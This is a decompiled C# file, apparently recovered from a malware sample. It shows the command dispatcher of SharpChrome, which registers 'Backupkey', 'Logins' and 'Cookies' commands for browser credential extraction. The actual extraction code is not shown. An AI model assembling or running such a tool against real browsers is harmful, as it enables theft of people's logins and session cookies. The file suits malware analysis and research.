// Decompiled with JetBrains decompiler
// Type: SharpChrome.Domain.CommandCollection
// Assembly: SharpChrome, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D938FA4A-3611-4CA7-B3BE-AF9F6D845B7B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\VHO-Trojan.MSIL.Convagent.gen-340a639e1ec7cb2afa90a2aba177b368e13efc4dd1313e32af30b6ceb259f7d3.exe

using SharpChrome.Commands;
using System;
using System.Collections.Generic;

namespace SharpChrome.Domain
{
  public class CommandCollection
  {
    private readonly Dictionary<string, Func<ICommand>> _availableCommands = new Dictionary<string, Func<ICommand>>();

    public CommandCollection()
    {
      this._availableCommands.Add(Backupkey.CommandName, (Func<ICommand>) (() => (ICommand) new Backupkey()));
      this._availableCommands.Add(Logins.CommandName, (Func<ICommand>) (() => (ICommand) new Logins()));
      this._availableCommands.Add(Cookies.CommandName, (Func<ICommand>) (() => (ICommand) new Cookies()));
    }

    public bool ExecuteCommand(string commandName, Dictionary<string, string> arguments)
    {
      bool flag;
      if (string.IsNullOrEmpty(commandName) || !this._availableCommands.ContainsKey(commandName))
      {
        flag = false;
      }
      else
      {
        this._availableCommands[commandName]().Execute(arguments);
        flag = true;
      }
      return flag;
    }
  }
}
